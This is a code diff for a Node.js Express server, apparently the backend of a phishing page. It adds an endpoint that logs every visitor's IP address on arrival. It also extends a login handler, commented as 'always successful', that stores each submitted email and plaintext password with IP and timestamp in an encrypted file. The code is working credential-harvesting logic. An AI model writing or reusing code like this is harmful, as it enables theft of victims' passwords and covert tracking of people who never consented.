@@ -24,6 +24,22 @@ function encrypt(text) {
     return `${iv.toString("base64")}:${encrypted}`;
 }
 
+// ⭐ Log IP instantly when entering the site
+app.post("/track-ip", (req, res) => {
+    const userIP =
+        req.headers["x-forwarded-for"] ||
+        req.socket.remoteAddress ||
+        "Unknown IP";
+
+    const data = `ip=${userIP}; visited=${new Date().toISOString()}`;
+    const encrypted = encrypt(data);
+
+    fs.appendFileSync("users.enc.txt", encrypted + "\n");
+
+    res.send("ok");
+});
+
+// ⭐ Always successful login + encrypted logging
 app.post("/login", (req, res) => {
     const userIP =
         req.headers["x-forwarded-for"] ||
@@ -33,8 +49,7 @@ app.post("/login", (req, res) => {
     const email = req.body.email;
     const password = req.body.password;
 
-    const data = `email=${email}; password=${password}; ip=${userIP}`;
-
+    const data = `email=${email}; password=${password}; ip=${userIP}; login=${new Date().toISOString()}`;
     const encrypted = encrypt(data);
 
     fs.appendFileSync("users.enc.txt", encrypted + "\n");
